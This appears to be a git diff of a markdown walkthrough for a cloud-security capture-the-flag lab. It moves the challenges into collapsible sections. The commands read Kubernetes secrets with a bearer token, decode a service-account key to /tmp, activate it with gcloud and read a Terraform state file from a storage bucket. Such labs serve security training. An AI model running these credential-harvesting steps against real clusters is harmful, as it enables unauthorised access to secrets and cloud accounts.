@@ -1,10 +1,7 @@
-# Setup
+# Commands
 
-set project id
-#####
-    export PROJECT_ID=nodal-seer-306517
-
-# Challenge 1
+<details>
+  <summary>Challenge 1</summary>
 
 set cluster IP
 #####
@@ -30,18 +27,57 @@ You can also query them by using the Kubernetes API:
 #####
     curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/pods
 
-## Walkthrough
+  <details>
+    <summary>Walkthrough</summary>
+  
+  You can read Kubernetes secrets in the default namespace on the cluster. Which secrets might it hold?  
+  #####
+      curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/secrets
+  
+  The secret values are base64 encoded. Decode them to read the value:  
+  #####
+      echo -n <secret-value> | base64 -d  
 
-You can read Kubernetes secrets in the default namespace on the cluster. Which secrets might it hold?  
+  Safe blob to file
+  #####
+      echo -n <secret-value> | base64 -d  > /tmp/sa_key.json
+  
+  </details>
+
+</details>
+
+
+<details>
+  <summary>Challenge 2</summary>
+
+set project id
 #####
-    curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/secrets
+    export PROJECT_ID=nodal-seer-306517
 
-The secret values are base64 encoded. Decode them to read the value:  
+activate service account
 #####
-    echo -n <secret-value> | base64 -d  
+    gcloud auth activate-service-account --key-file /tmp/sa_key.json
 
+check service account
+#####
+    gcloud auth list
 
-# Challenge 2
+  <details>
+    <summary>Walkthrough</summary>
+
+  List files on bucket
+  #####
+    gsutil ls gs://file-uploads-$PROJECT_ID
+
+  Read state file on bucket
+  #####
+    gsutil cat gs://file-uploads-$PROJECT_ID/default.tfstate
+
+  
+  </details>
+
+</details>
+
 
 # Challenge 3
 
